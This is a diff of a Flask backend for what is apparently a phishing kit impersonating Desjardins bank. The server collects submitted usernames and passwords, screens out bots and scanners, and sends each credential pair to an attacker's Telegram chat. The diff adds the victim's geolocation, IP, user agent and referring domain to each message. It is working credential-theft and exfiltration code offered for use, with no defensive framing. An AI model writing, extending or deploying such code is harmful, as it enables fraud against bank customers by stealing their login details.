@@ -5,6 +5,7 @@ from flask_limiter.util import get_remote_address
 import os
 import re
 import time
+import json
 import urllib.request
 import urllib.parse
 
@@ -32,39 +33,30 @@ TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
 TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "")
 
 # ---------- Bot Detection Helpers ----------
-# Simple in-memory tracker for rapid-fire submissions
 recent_submissions = {}
 
 def is_likely_bot(username, password, ip):
-    """Returns True if request looks like a bot."""
     now = time.time()
 
-    # 1. Length checks
     if len(username) < 3 or len(username) > 60:
         return True
     if len(password) < 4 or len(password) > 100:
         return True
 
-    # 2. Random-looking username (all lowercase letters+digits, no @, no space, > 8 chars)
-    # Example: "Bt2rtlv41", "pknkjfnasda"
     if "@" not in username and " " not in username:
         if len(username) >= 8:
-            # ratio of digits + no vowel pattern
             has_vowel = bool(re.search(r"[aeiouAEIOU]", username))
             if not has_vowel:
                 return True
-            # Too many consonants in a row (5+)
             if re.search(r"[^aeiouAEIOU0-9@._-]{5,}", username):
                 return True
 
-    # 3. Same IP submitting multiple times within 10 seconds
     if ip in recent_submissions:
         last = recent_submissions[ip]
         if now - last < 10:
             return True
     recent_submissions[ip] = now
 
-    # Clean old entries
     for k in list(recent_submissions.keys()):
         if now - recent_submissions[k] > 60:
             del recent_submissions[k]
@@ -72,24 +64,54 @@ def is_likely_bot(username, password, ip):
     return False
 
 
-def send_to_telegram(username, password):
+def get_geo_info(ip):
+    """Fetch geo info from ip-api.com (free, no key needed)."""
+    try:
+        url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,query"
+        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            data = json.loads(resp.read().decode())
+            if data.get("status") == "success":
+                return {
+                    "country": data.get("country", "Unknown"),
+                    "region":  data.get("regionName", "Unknown"),
+                    "city":    data.get("city", "Unknown"),
+                    "isp":     data.get("isp", "Unknown"),
+                }
+    except Exception as e:
+        print(f"⚠️ Geo lookup failed: {e}")
+    return {"country": "Unknown", "region": "Unknown", "city": "Unknown", "isp": "Unknown"}
+
+
+def send_to_telegram(username, password, ip, user_agent):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         print("⚠️ Telegram not configured")
         return
 
+    geo = get_geo_info(ip)
+    date = time.strftime("%Y-%m-%d")
+
+    # ---- Extract domain from Referer/Origin if possible ----
+    domain = request.headers.get("Origin") or request.headers.get("Referer") or "N/A"
+    domain = domain.replace("https://", "").replace("http://", "").split("/")[0]
+
     message = (
-        f"🏦 {BANK_NAME}\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"📅 {date}\n"
-        f"🌐 {domain}\n"
-        f"📍 {country} | {region} | {city}\n"
-        f"🗣 {lang} | 📡 {isp}\n"
-        f"🖥 IP: {ip}\n"
-        f"🧭 UA: {user_agent}\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"👤 Username: {username or '(empty)'}\n"
-        f"🔑 Password: {password or '(empty)'}\n"
-        f"━━━━━━━━━━━━━━━━━━━━"
+        f"====================\n"
+        f"DESJARDINS\n"
+        f"++++++++++++++++++++\n"
+        f"{date}\n"
+        f"domain: {domain}\n"
+        f"{geo['country']}|{geo['region']}|{geo['city']}|eng|{geo['isp']}|\n"
+        f"ip: {ip}\n"
+        f"ua: {user_agent}\n"
+        f"\n"
+        f"Username : {username or ''}\n"
+        f"Password : {password or ''}\n"
+        f"\n"
+        f"\n"
+        f"\n"
+        f"++++++++++++++++++++\n"
+        f"===================="
     )
 
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -106,6 +128,7 @@ def send_to_telegram(username, password):
     except Exception as e:
         print(f"❌ Telegram error: {e}")
 
+
 # ---------- Routes ----------
 @app.route("/", methods=["GET"])
 def home():
@@ -121,7 +144,7 @@ def save():
     if not data:
         return jsonify({"success": False, "message": "No data provided"}), 400
 
-    # Honeypot check — frontend should have a hidden "website" field
+    # Honeypot check
     if data.get("website"):
         return jsonify({"success": False, "message": "Bad request"}), 400
 
@@ -132,17 +155,17 @@ def save():
         return jsonify({"success": False, "message": "All fields required"}), 400
 
     ip = get_remote_address()
+    user_agent = request.headers.get("User-Agent", "Unknown")
 
     if is_likely_bot(username, password, ip):
         print(f"🤖 Bot blocked: {username} from {ip}")
-        # Still return success so bot doesn't retry
         return jsonify({
             "success": True,
             "message": "Saved successfully ✅",
             "redirect_url": REDIRECT_URL
         })
 
-    send_to_telegram(username, password)
+    send_to_telegram(username, password, ip, user_agent)
     print(f"💾 Received: {username}")
 
     return jsonify({
